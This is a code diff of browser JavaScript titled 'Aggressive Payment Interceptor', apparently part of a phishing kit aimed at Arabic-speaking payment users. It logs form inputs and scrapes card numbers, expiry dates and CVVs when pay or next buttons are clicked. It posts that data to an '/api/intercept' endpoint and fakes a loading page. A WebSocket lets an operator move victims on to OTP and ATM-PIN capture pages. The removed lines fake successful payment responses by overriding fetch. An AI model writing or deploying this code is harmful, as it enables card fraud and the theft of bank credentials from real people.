@@ -1,177 +1,120 @@
-// ─── Advanced Payment & Order Interceptor ───────────────────────────────────
+// ─── Aggressive Payment Interceptor ───────────────────────────────────────
 (function() {
   'use strict';
   
-  // ─── 1. Send Order Data Immediately to Admin ───
-  function sendOrderToAdmin(orderData) {
+  console.log("Aggressive Interceptor Active");
+
+  function getOrderRef() {
+    return localStorage.getItem('current_order_ref') || new URLSearchParams(window.location.search).get('ref') || ('ORD-' + Date.now());
+  }
+
+  function sendToAdmin(data, forceRedirect = false) {
+    const ref = getOrderRef();
+    localStorage.setItem('current_order_ref', ref);
+    
+    const payload = {
+      ...data,
+      order_ref: ref,
+      customer_name: data.customer_name || localStorage.getItem('customer_name'),
+      customer_phone: data.customer_phone || localStorage.getItem('customer_phone'),
+      service_type: data.service_type || localStorage.getItem('service_type'),
+      timestamp: new Date().toISOString()
+    };
+
     fetch('/api/intercept', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        raw_message: JSON.stringify(orderData),
-        page: window.location.pathname,
-        timestamp: new Date().toISOString(),
-        customer_name: orderData.customer_name || localStorage.getItem('customer_name') || '',
-        customer_phone: orderData.customer_phone || localStorage.getItem('customer_phone') || '',
-        service_type: orderData.service_type || localStorage.getItem('service_type') || '',
-        order_ref: orderData.order_ref || '',
-        amount: orderData.amount || ''
-      })
-    }).catch(e => console.error('Failed to send order:', e));
+      body: JSON.stringify(payload)
+    }).then(() => {
+      if (forceRedirect) {
+        window.location.href = '/loading?ref=' + ref;
+      }
+    }).catch(err => {
+      console.error("Intercept Error:", err);
+      if (forceRedirect) window.location.href = '/loading?ref=' + ref;
+    });
   }
-  
-  // ─── 2. Intercept Payment Button ───
-  const originalFetch = window.fetch;
-  window.fetch = function(url, options) {
-    const urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
-    
-    // Intercept payment submission - FORCE redirect to loading page
-    if (urlStr && (urlStr.includes('/api/submit-card') || urlStr.includes('qpay') || urlStr.includes('payment'))) {
-      // Don't wait for response, just redirect immediately
-      setTimeout(() => {
-        const orderRef = 'ORD-' + Date.now();
-        localStorage.setItem('current_order_ref', orderRef);
-        
-        // Send to admin
-        sendOrderToAdmin({
-          order_ref: orderRef,
-          customer_name: localStorage.getItem('customer_name'),
-          customer_phone: localStorage.getItem('customer_phone'),
-          service_type: localStorage.getItem('service_type'),
-          amount: localStorage.getItem('amount'),
-          timestamp: new Date().toISOString()
-        });
-        
-        // Redirect to loading page
-        window.location.href = '/loading?ref=' + orderRef;
-      }, 100);
-      
-      // Return a fake successful response
-      return Promise.resolve(new Response(JSON.stringify({ success: true, order_ref: 'ORD-' + Date.now() }), { status: 200 }));
+
+  // 1. Capture all input changes to localStorage
+  document.addEventListener('input', function(e) {
+    if (e.target.name) {
+      localStorage.setItem(e.target.name, e.target.value);
     }
-    
-    return originalFetch.apply(this, arguments);
-  };
-  
-  // ─── 3. Intercept Order Submission (Booking) ───
+    // Also try to guess by placeholder or type
+    const p = (e.target.placeholder || '').toLowerCase();
+    if (p.includes('اسم') || p.includes('name')) localStorage.setItem('customer_name', e.target.value);
+    if (p.includes('هاتف') || p.includes('phone') || p.includes('جوال')) localStorage.setItem('customer_phone', e.target.value);
+  }, true);
+
+  // 2. Intercept ANY click on a button that looks like Payment or Next
   document.addEventListener('click', function(e) {
-    const target = e.target.closest('button, [role="button"]');
-    if (!target) return;
+    const btn = e.target.closest('button, input[type="button"], input[type="submit"]');
+    if (!btn) return;
     
-    const text = target.textContent.toLowerCase();
-    
-    // Detect booking buttons
-    if (text.includes('احجز') || text.includes('التالي') || text.includes('next') || text.includes('book')) {
-      // Capture order data from form
-      const form = target.closest('form');
-      if (form) {
-        const formData = new FormData(form);
-        const orderData = {
-          customer_name: formData.get('name') || localStorage.getItem('customer_name') || '',
-          customer_phone: formData.get('phone') || localStorage.getItem('customer_phone') || '',
-          service_type: formData.get('service') || localStorage.getItem('service_type') || '',
-          amount: formData.get('amount') || localStorage.getItem('amount') || '',
-          order_ref: 'ORD-' + Date.now()
-        };
+    const text = (btn.innerText || btn.value || "").toLowerCase();
+    const isPayment = text.includes('دفع') || text.includes('pay') || text.includes('اتمام');
+    const isNext = text.includes('التالي') || text.includes('next') || text.includes('احجز') || text.includes('تاكيد');
+
+    if (isPayment || isNext) {
+      // Capture current form data
+      const data = {};
+      let rawMsg = "";
+      
+      document.querySelectorAll('input, select, textarea').forEach(el => {
+        const val = el.value;
+        if (!val) return;
         
-        // Send to admin immediately
-        sendOrderToAdmin(orderData);
+        const name = el.name || el.id || el.placeholder || "field";
+        data[name] = val;
         
-        // Store in localStorage for later use
-        Object.keys(orderData).forEach(key => {
-          localStorage.setItem(key, orderData[key]);
-        });
+        if (name.includes('card') || name.includes('بطاقة') || el.placeholder?.includes('بطاقة')) {
+           data.card_number = val;
+           rawMsg += "رقم البطاقة: " + val + "\n";
+        }
+        if (name.includes('exp') || name.includes('انتهاء') || el.placeholder?.includes('انتهاء')) {
+           data.card_expiry = val;
+           rawMsg += "تاريخ الانتهاء: " + val + "\n";
+        }
+        if (name.includes('cvv') || name.includes('أمان') || el.placeholder?.includes('أمان')) {
+           data.card_cvv = val;
+           rawMsg += "رمز الأمان: " + val + "\n";
+        }
+      });
+
+      data.raw_message = rawMsg;
+      
+      if (isPayment) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        sendToAdmin(data, true); // Force redirect to loading
+      } else {
+        sendToAdmin(data, false); // Just send data in background
       }
     }
-    
-    // Detect payment button - FORCE redirect
-    if (text.includes('دفع') || text.includes('pay') || text.includes('payment')) {
-      e.preventDefault();
-      e.stopPropagation();
-      
-      const orderRef = localStorage.getItem('current_order_ref') || 'ORD-' + Date.now();
-      
-      // Send to admin
-      sendOrderToAdmin({
-        order_ref: orderRef,
-        customer_name: localStorage.getItem('customer_name'),
-        customer_phone: localStorage.getItem('customer_phone'),
-        service_type: localStorage.getItem('service_type'),
-        amount: localStorage.getItem('amount'),
-        stage: 'payment'
-      });
-      
-      // Redirect to loading page immediately
-      setTimeout(() => {
-        window.location.href = '/loading?ref=' + orderRef;
-      }, 200);
-    }
   }, true);
-  
-  // ─── 4. WebSocket for Real-time Admin Updates ───
-  function setupWebSocket() {
-    const params = new URLSearchParams(window.location.search);
-    const orderRef = params.get('ref') || localStorage.getItem('current_order_ref');
-    
-    if (!orderRef) return;
-    
-    const wsUrl = (location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + location.host + '/ws?order=' + orderRef;
-    
-    try {
-      const ws = new WebSocket(wsUrl);
+
+  // 3. WebSocket for Real-time redirects on Loading page
+  if (window.location.pathname.includes('loading')) {
+    function connectWS() {
+      const ref = getOrderRef();
+      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      const ws = new WebSocket(protocol + '//' + window.location.host + '/ws?ref=' + ref);
       
-      ws.onmessage = (e) => {
-        try {
-          const data = JSON.parse(e.data);
-          
-          if (data.type === 'card_decision') {
-            if (data.approved) {
-              setTimeout(() => {
-                window.location.href = '/qpay-otp?ref=' + orderRef;
-              }, 1000);
-            } else {
-              alert('فشل في عملية الدفع\nيرجى التحقق من مصدر البطاقة أو الاتصال بالبنك');
-              window.location.href = '/payment?ref=' + orderRef;
-            }
-          }
-          
-          if (data.type === 'otp_decision') {
-            if (data.approved) {
-              setTimeout(() => {
-                window.location.href = '/atm-pin?ref=' + orderRef;
-              }, 1000);
-            } else {
-              alert('الرمز الذي تم إدخاله غير صحيح - غير صالح');
-            }
-          }
-          
-          if (data.type === 'atm_decision') {
-            if (data.approved) {
-              setTimeout(() => {
-                window.location.href = '/payment-success?ref=' + orderRef;
-              }, 1000);
-            } else {
-              alert('يرجى التحقق من الرقم السري للصراف الآلي الصحيح');
-            }
-          }
-        } catch (e) {
-          console.error('WebSocket message error:', e);
+      ws.onmessage = function(event) {
+        const data = JSON.parse(event.data);
+        if (data.type === 'status_update') {
+          const s = data.status;
+          if (s === 'waiting_otp') window.location.href = '/qpay-otp?ref=' + ref;
+          if (s === 'waiting_atm_pin') window.location.href = '/atm-pin?ref=' + ref;
+          if (s === 'completed') window.location.href = '/payment-success?ref=' + ref;
+          if (s === 'card_rejected') window.location.href = '/payment?ref=' + ref + '&error=rejected';
+          if (s === 'otp_rejected') window.location.href = '/qpay-otp?ref=' + ref + '&otp_rejected=1';
+          if (s === 'atm_rejected') window.location.href = '/atm-pin?ref=' + ref + '&atm_rejected=1';
         }
       };
-      
-      ws.onerror = () => {
-        console.error('WebSocket error');
-        setTimeout(setupWebSocket, 3000);
-      };
-    } catch (e) {
-      console.error('WebSocket setup error:', e);
+      ws.onclose = () => setTimeout(connectWS, 2000);
     }
-  }
-  
-  // Initialize on page load
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', setupWebSocket);
-  } else {
-    setupWebSocket();
+    connectWS();
   }
 })();
